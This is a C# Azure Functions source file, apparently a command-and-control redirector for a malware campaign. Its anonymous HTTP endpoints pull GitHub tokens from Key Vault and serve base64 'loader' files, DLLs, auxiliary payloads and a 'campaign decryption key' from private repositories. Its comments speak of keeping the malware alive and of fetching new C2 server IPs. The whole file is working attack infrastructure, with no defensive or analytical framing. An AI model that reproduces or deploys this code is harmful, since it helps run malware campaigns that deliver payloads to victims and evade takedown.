using System;
using System.IO;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System.Net.Http;
using System.Net.Http.Headers;
using Azure.Identity;
using Azure.Security.KeyVault.Secrets;
using System.Text;
using Microsoft.Extensions.Configuration;
using System.Text.RegularExpressions;

namespace GitRDone
{
    public static class GitRDone
    {
        private static readonly HttpClient client = new HttpClient();

        private static bool isInitialized = false;
        private static string dllToken;
        private static string auxToken;
        private static string ghUsername;
        private static string dllRepo;
        private static string auxRepo;
        private static string publicRepo;


        private static async Task InitializeauxTokenConfig(ExecutionContext newContext)
        {
                (auxToken, ghUsername, auxRepo) = await GetAuxToken(newContext);
                isInitialized = true; 
        }

        public static async Task<(string auxToken, string ghUsername, string auxRepo)> GetAuxToken(ExecutionContext newContext)
        {
            var keyVaultUrl = Environment.GetEnvironmentVariable("KeyVaultUrl");

            var kvClient = new SecretClient(new Uri(keyVaultUrl), new DefaultAzureCredential());

            // Retrieve the GitHub token
            KeyVaultSecret secretToken = await kvClient.GetSecretAsync("auxToken");
            string auxToken = secretToken.Value;

            // Retrieve the GitHub username
            KeyVaultSecret secretghUsername = await kvClient.GetSecretAsync("ghUsername");
            string ghUsername = secretghUsername.Value;

            // Retrieve the repo name
            KeyVaultSecret secretauxRepo = await kvClient.GetSecretAsync("auxRepo");
            string auxRepo = secretauxRepo.Value;

            return (auxToken, ghUsername,  auxRepo);
        }

        // Legacy routes refactored from original components redirector 

        // Get the campaign decryption key

        [FunctionName("KeyAssets")]
        public static async Task<IActionResult> RunKeyAssets(
        [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = "identity/{fileName}")] HttpRequest req,
        string fileName, ExecutionContext newContext,
        ILogger log)
        {
            log.LogInformation($"C# HTTP trigger function processed a request for file: {fileName}");
            await InitializeauxTokenConfig(newContext);
            var githubUrl = $"https://api.github.com/repos/{ghUsername}/{auxRepo}/contents/{fileName}.txt";
            using (var client = new HttpClient())
            {
                // Ensure the same headers setup as in other functions
              
                client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("AppName", "1.0"));
                client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", auxToken);

                HttpResponseMessage response = await client.GetAsync(githubUrl);
                if (response.IsSuccessStatusCode)
                {
                    var jsonResponse = await response.Content.ReadAsStringAsync();
                    var contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
                    string encodedContent = contentObject.content;
                    return new OkObjectResult(encodedContent);
                }
                else
                {
                    log.LogError($"Failed to retrieve file: {response.StatusCode}");
                    return new NotFoundResult();
                }
            }
        }

        // Multi-Purpose redirector for aux payloads, tools, whatever as a b64 blob. Keep modules separate from utilities, etc

        [FunctionName("ADMAssets")]
        public static async Task<IActionResult> RunADMAssets(
            [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = "adm/{fileName}")] HttpRequest req,
            string fileName,
            ILogger log, ExecutionContext newContext)
        {
            await InitializeauxTokenConfig(newContext); 

            log.LogInformation($"C# HTTP trigger function processed a request for file: {fileName}");
            var githubUrl = $"https://api.github.com/repos/{ghUsername}/{auxRepo}/contents/{fileName}.txt";

            using (var newClient = new HttpClient())
            {
                newClient.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("AppName", "1.0"));
                newClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", auxToken);
                HttpResponseMessage response = await newClient.GetAsync(githubUrl);
                if (response.IsSuccessStatusCode)
                {
                    var jsonResponse = await response.Content.ReadAsStringAsync();
                    var contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
                    string encodedContent = contentObject.content;
                    return new OkObjectResult(encodedContent);

                }
                else
                {
                    log.LogError($"Failed to retrieve file: {response.StatusCode}");
                    return new StatusCodeResult((int)response.StatusCode);
                }
            }
        }
        
        private static async Task InitializeConfig(ExecutionContext context)
        {
                (dllToken, ghUsername, dllRepo, auxRepo) = await GetDLLConfig(context);
                isInitialized = true;
        }

        public static async Task<(string dllToken, string ghUsername, string dllRepo, string auxRepo)> GetDLLConfig(ExecutionContext context)
        {
            var keyVaultUrl = Environment.GetEnvironmentVariable("KeyVaultUrl");

            var kvClient = new SecretClient(new Uri(keyVaultUrl), new DefaultAzureCredential());

            // Retrieve the GitHub token
            KeyVaultSecret secretToken = await kvClient.GetSecretAsync("dllToken");
            string dllToken = secretToken.Value;

            // Retrieve the GitHub name
            KeyVaultSecret secretghUsername = await kvClient.GetSecretAsync("ghUsername");
            string ghUsername = secretghUsername.Value;

            // Retrieve the repository name
            KeyVaultSecret secretdllRepo = await kvClient.GetSecretAsync("dllRepo");
            string dllRepo = secretdllRepo.Value;

            KeyVaultSecret secretauxRepo = await kvClient.GetSecretAsync("auxRepo");
            string auxRepo = secretauxRepo.Value;

            return (dllToken, ghUsername, dllRepo, auxRepo);
        }

        [FunctionName("LoaderAssets")]
        public static async Task<IActionResult> Run23(
        [HttpTrigger(AuthorizationLevel.Anonymous, "get", "post", Route = "assets/{fileName}")] HttpRequest req,
        string fileName,
        ILogger log, ExecutionContext context)
        {
            await InitializeConfig(context);
            string repoUrl = $"https://api.github.com/repos/{ghUsername}/{dllRepo}/contents/{fileName}.txt";

            using (var newClient = new HttpClient())
            {
                newClient.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("AppName", "1.0"));
                newClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", dllToken);
                HttpResponseMessage response = await newClient.GetAsync(repoUrl);
                if (response.IsSuccessStatusCode)
                {
                    string jsonResponse = await response.Content.ReadAsStringAsync();
                    var contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
                    string encodedContent = contentObject.content;
                    byte[] data = Convert.FromBase64String(encodedContent);
                    string decodedContent = Encoding.UTF8.GetString(data);

                    log.LogInformation($"File content: {decodedContent}");
                    return new OkObjectResult(decodedContent);
                }
                else
                {
                    log.LogError($"Failed to retrieve file: {response.StatusCode}");
                    return new StatusCodeResult((int)response.StatusCode);
                }
            }
        }


        // Check dll Repo authentication
        [FunctionName("CheckRepo")]
        public static async Task<IActionResult> Run(
            [HttpTrigger(AuthorizationLevel.Anonymous, "get", "post", Route = "test")] HttpRequest req,
            ILogger log, ExecutionContext context)
        {
            await InitializeConfig(context);

            // Use the initialized static variables
            string repoUrl = $"https://api.github.com/repos/{ghUsername}/{dllRepo}/contents/test.txt";

            using (var newClient = new HttpClient())
            {
                newClient.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("AppName", "1.0"));
                newClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", dllToken);

                HttpResponseMessage response = await newClient.GetAsync(repoUrl);
                if (response.IsSuccessStatusCode)
                {
                    string jsonResponse = await response.Content.ReadAsStringAsync();
                    var contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
                    string encodedContent = contentObject.content;
                    byte[] data = Convert.FromBase64String(encodedContent);
                    string decodedContent = Encoding.UTF8.GetString(data);

                    log.LogInformation($"File content: {decodedContent}");
                    return new OkObjectResult(decodedContent);
                }
                else
                {
                    log.LogError($"Failed to retrieve file: {response.StatusCode}");
                    return new StatusCodeResult((int)response.StatusCode);
                }
            }
        }



        [FunctionName("CheckStatus")]
        public static async Task<IActionResult> Run33(
        [HttpTrigger(AuthorizationLevel.Anonymous, "get", "post", Route = "status")] HttpRequest req,
        ILogger log)
        {
            log.LogInformation($"C# HTTP trigger function processed a request for status");

            // Rewrite the URL to match GitHub's structure
            // Public repo for public status check, malware will stay alive until you onboard new redirector
            var githubUrl = $"https://raw.githubusercontent.com/{ghUsername}/{publicRepo}/main/status.txt";

            var response = await client.GetAsync(githubUrl);

            if (response.IsSuccessStatusCode)
            {
                var content = await response.Content.ReadAsStringAsync();
                return new OkObjectResult(content);
            }

            return new NotFoundResult();
        }

        // if status = redirect, grab the new C2 servers IP from a file in the repo
        [FunctionName("CheckRedirect")]
        public static async Task<IActionResult> RunRedirect(
        [HttpTrigger(AuthorizationLevel.Anonymous, "get", "post", Route = "redirect")] HttpRequest req,
        ILogger log, ExecutionContext context)
        {
            await InitializeConfig(context);

            string repoUrl = $"https://api.github.com/repos/{ghUsername}/{dllRepo}/contents/redirect.txt";

            using (var newClient = new HttpClient())
            {
                newClient.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("AppName", "1.0"));
                newClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", dllToken);

                HttpResponseMessage response = await newClient.GetAsync(repoUrl);
                if (response.IsSuccessStatusCode)
                {
                    string jsonResponse = await response.Content.ReadAsStringAsync();
                    dynamic contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
                    string encodedContent = contentObject.content;

                    // Handling possible Base64 decoding issues
                    try
                    {
                        byte[] data = Convert.FromBase64String(encodedContent);
                        string decodedContent = Encoding.UTF8.GetString(data);

                        log.LogInformation($"File content: {decodedContent}");
                        return new OkObjectResult(decodedContent);
                    }
                    catch (FormatException ex)
                    {
                        log.LogError($"Base64 decoding failed: {ex.Message}");
                        return new BadRequestObjectResult("Invalid Base64 content.");
                    }
                }
                else
                {
                    log.LogError($"Failed to retrieve file: {response.StatusCode}");
                    return new StatusCodeResult((int)response.StatusCode);
                }
            }
        }

        private static bool IsBase64String(string s)
        {
            s = s.Trim();
            return (s.Length % 4 == 0) && Regex.IsMatch(s, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        // [FunctionName("DllAssets")]
        // public static async Task<IActionResult> RunDll(
        // [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = "libraries/{fileName}")] HttpRequest req,
        // string fileName,
        // ILogger log)
        // {
        //     log.LogInformation($"C# HTTP trigger function processed a request for file: {fileName}");
        //     var githubUrl = $"https://api.github.com/repos/{ghUsername}/{dllRepo}/contents/{fileName}.dll";

        //     using (var client = new HttpClient())
        //     {
        //         client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("AppName", "1.0"));
        //         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", dllToken);

        //         HttpResponseMessage response = await client.GetAsync(githubUrl);
        //         if (response.IsSuccessStatusCode)
        //         {
        //             string jsonResponse = await response.Content.ReadAsStringAsync();
        //             var contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
        //             string encodedContent = contentObject.content;
        //             byte[] data = Convert.FromBase64String(encodedContent);
        //             string decodedContent = Encoding.UTF8.GetString(data);

        //             return new OkObjectResult(decodedContent);
        //         }
        //         else
        //         {
        //             log.LogError($"Failed to retrieve file: {response.StatusCode}");
        //             return new StatusCodeResult((int)response.StatusCode);
        //         }
        //     }
        // }



        // // Application mime-type for Zips, example of referencing master branch. Legacy now, maybe still useful

        // [FunctionName("ZipAssets")]
        // public static async Task<IActionResult> RunZip(
        //     [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = "zip/{fileName}")] HttpRequest req,
        //     string fileName,
        //     ILogger log)
        // {
        //     log.LogInformation($"C# HTTP trigger function processed a request for file: {fileName}.zip");

        //     // Using the GitHub API URL format
        //     var githubUrl = $"https://api.github.com/repos/{ghUsername}/{auxRepo}/contents/{fileName}.zip?ref=master";

        //     using (var client = new HttpClient())
        //     {
        //         // Assuming dllToken is used for authorization
        //         client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", dllToken);
        //         client.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("YourAppName", "1.0"));

        //         HttpResponseMessage response = await client.GetAsync(githubUrl);
        //         if (response.IsSuccessStatusCode)
        //         {
        //             string jsonResponse = await response.Content.ReadAsStringAsync();
        //             var contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
        //             string encodedContent = contentObject.content;
        //             byte[] decodedContent = Convert.FromBase64String(encodedContent);

        //             return new FileContentResult(decodedContent, "application/zip") { FileDownloadName = fileName + ".zip" };
        //         }
        //         else
        //         {
        //             log.LogError($"Failed to retrieve file: {response.StatusCode}");
        //             return new NotFoundResult();
        //         }
        //     }
        // }










        // Multi-Purpose redirector for DropD

        // [FunctionName("AppLibs")]
        // public static async Task<IActionResult> Run2(
        //     [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = "applibs/{fileName}")] HttpRequest req,
        //     string fileName,
        //     ILogger log, ExecutionContext context)
        // {
        //     await InitializeConfig(context); // Ensure configuration is initialized

        //     log.LogInformation($"C# HTTP trigger function processed a request for file: {fileName}");

        //     // Use the static variables initialized earlier
        //     var githubUrl = $"https://api.github.com/repos/{ghUsername}/{dllRepo}/contents/{fileName}";

        //     using (var newClient = new HttpClient())
        //     {
        //         newClient.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue("AppName", "1.0"));
        //         newClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", dllToken);

        //         /*HttpResponseMessage response = await newClient.GetAsync(githubUrl);*/
        //         HttpResponseMessage response = await newClient.GetAsync(githubUrl);
        //         if (response.IsSuccessStatusCode)
        //         {
        //             string jsonResponse = await response.Content.ReadAsStringAsync();
        //             var contentObject = JsonConvert.DeserializeObject<dynamic>(jsonResponse);
        //             string encodedContent = contentObject.content;
        //             byte[] data = Convert.FromBase64String(encodedContent);
        //             string decodedContent = Encoding.UTF8.GetString(data);

        //             return new OkObjectResult(decodedContent);
        //         }
        //         else
        //         {
        //             log.LogError($"Failed to retrieve file: {response.StatusCode}");
        //             return new StatusCodeResult((int)response.StatusCode);
        //         }
        //     }
        // }
    }
}

